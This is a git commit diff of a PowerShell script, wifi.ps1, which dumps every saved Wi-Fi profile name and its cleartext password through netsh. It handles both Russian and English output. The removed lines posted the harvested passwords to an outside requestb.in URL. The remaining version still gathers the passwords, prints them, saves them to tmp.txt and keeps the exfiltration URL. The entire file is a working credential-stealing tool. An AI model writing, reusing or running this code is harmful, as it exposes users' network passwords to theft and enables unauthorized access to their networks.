4dc19f83d82d7e2fd46db3efacbf9046305d4a08
Danij123 <ddanijj@gmail.com>
2017-10-25 22:13:35 +0300

    Update wifi.ps1

--- wifi.ps1
+++ wifi.ps1
@@ -1,8 +1,6 @@
-$wifi_ru=(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize 
+$wifi_ru=(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize
 $wifi_en=(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "key\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize 
 $url="https://requestb.in/zx2l4tzx"
+$wifi_ru
 $wifi_ru | Out-File tmp.txt
 $data=Get-Content .\tmp.txt
-Invoke-RestMethod -Method Post -Uri $url -Body $data
-Invoke-RestMethod -Method Post -Uri $url -Body $data
-
